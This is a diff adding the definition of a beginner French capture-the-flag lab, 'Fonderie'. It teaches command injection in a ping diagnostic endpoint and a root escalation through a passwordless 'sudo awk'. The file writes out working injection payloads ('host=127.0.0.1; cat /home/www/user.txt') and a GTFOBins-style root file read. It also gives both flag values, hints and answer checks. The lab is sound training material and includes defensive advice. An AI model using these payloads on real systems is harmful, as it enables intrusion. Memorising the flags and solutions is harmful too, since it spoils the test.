@@ -1,0 +1,106 @@
+title: Fonderie
+track: offensif
+machine_os: linux
+level: debutant
+order: 2
+tags: [machine, web, injection de commande, rce, élévation de privilèges, sudo, linux]
+summary: Machine Facile Linux - une injection de commande dans un outil de diagnostic ouvre un accès, puis un sudo mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{f0nd3r1e_1nj3ct10n_rce}"
+  root: "TDM{f0nd3r1e_sud0_awk_r00t}"
+description: |
+  **Machine : Fonderie · Facile · 🐧 Linux**
+
+  Tu as un poste d'attaque (ce terminal) sur le même réseau qu'un serveur, **`cible`**. Tu ne peux
+  l'atteindre **que par le réseau** : pas d'accès direct à son disque. Ton objectif, comme sur Hack The
+  Box : obtenir un accès, lire le **drapeau utilisateur** (`user.txt`), puis élever tes privilèges pour
+  lire le **drapeau root** (`root.txt`). Valide chaque drapeau dans le panneau **🚩 Drapeaux**.
+
+  Tout est isolé dans le réseau du lab (`internal`) : rien ne sort de ta machine. **Réinitialiser**
+  reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - la page propose un outil de diagnostic.
+  2. L'outil passe le paramètre `host` à un `ping`. Teste s'il est injectable
+     (`;`, `|`, `$(...)`). Une **injection de commande** te donne l'exécution de code à distance (RCE).
+  3. Avec le RCE, tu agis en tant que l'utilisateur du service (`www`) : lis `user.txt`.
+  4. Regarde ce que `www` a le droit de lancer en `sudo` (`sudo -l`). Un binaire autorisé sans mot de
+     passe peut servir à **lire un fichier en root** : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `nmap`, `nc`, `python3`.
+cours: |
+  ## Injection de commande et élévation de privilèges
+
+  ### Injection de commande (RCE)
+
+  Quand une application insère une entrée utilisateur dans une **commande shell** sans la valider, on
+  peut enchaîner nos propres commandes. Les séparateurs shell classiques :
+
+  ```
+  ;   enchaîne une commande      :  127.0.0.1; id
+  |   redirige vers une commande :  127.0.0.1 | id
+  $(...) / `...`  substitution   :  $(id)
+  ```
+
+  Ici, `host=127.0.0.1` devient `ping -c 1 -W 1 127.0.0.1`. En envoyant
+  `host=127.0.0.1; cat /home/www/user.txt`, le serveur exécute aussi ton `cat`. Pense à **encoder
+  l'URL** (`;` = `%3B`, espace = `%20`) ou à laisser `curl --data-urlencode` s'en charger :
+
+  ```
+  curl -s "http://cible/diag?host=127.0.0.1;id"
+  curl -s -G http://cible/diag --data-urlencode 'host=127.0.0.1; cat /home/www/user.txt'
+  ```
+
+  ### Élévation de privilèges par sudo
+
+  `sudo -l` liste ce qu'un utilisateur peut exécuter en root. Un binaire autorisé **sans mot de passe**
+  est souvent détournable (voir *GTFOBins*). Par exemple, `awk` peut lancer une commande :
+
+  ```
+  sudo awk 'BEGIN{system("cat /root/root.txt")}'
+  ```
+
+  Comme l'exécution se fait via l'injection (donc en tant que `www`), tu enchaînes : injection → `sudo -l`
+  → lecture de `root.txt` en root.
+
+  ### Côté défense
+
+  Ne jamais construire une commande shell à partir d'une entrée : utiliser des API sûres (pas de
+  `shell=True`), valider strictement les entrées, et surtout **n'accorder aucun sudo NOPASSWD** sur des
+  binaires interactifs. Chaque maillon cassé ici correspond à une bonne pratique à appliquer.
+docs:
+  - title: OWASP - Command Injection
+    url: https://owasp.org/www-community/attacks/Command_Injection
+  - title: GTFOBins (abus de binaires en élévation de privilèges)
+    url: https://gtfobins.github.io/
+exercises:
+  - id: reconnaissance
+    title: Atteindre la cible
+    description: |
+      Depuis ce poste, confirme que le serveur `cible` répond et repère l'outil de diagnostic.
+      Enregistre la page d'accueil dans `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      La cible n'est pas publiée vers l'hôte : elle n'est joignable que par son nom de service `cible`
+      sur le réseau du lab. C'est le point de départ de toute attaque : savoir ce qui écoute et ce que
+      l'application propose.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Fonderie' /root/reponses/accueil.html
+  - id: rce
+    title: Prouver l'injection de commande
+    description: |
+      Exploite le paramètre `host` de `/diag` pour exécuter `id` **sur la cible** et enregistre la
+      sortie (qui doit montrer `uid=...(www)`) dans `/root/reponses/rce.txt`.
+    hint: "curl -s -G http://cible/diag --data-urlencode 'host=127.0.0.1; id' | tee /root/reponses/rce.txt"
+    cours: |
+      Obtenir la sortie de `id` prouve l'exécution de code à distance et te dit **en tant que qui** tu
+      agis (`www`). C'est la bascule de la reconnaissance vers l'exploitation : à partir de là, tu lis
+      des fichiers, tu explores, tu cherches l'élévation de privilèges.
+    checks:
+      - desc: La RCE s'exécute en tant que www
+        run: grep -q 'uid=' /root/reponses/rce.txt && grep -q 'www' /root/reponses/rce.txt
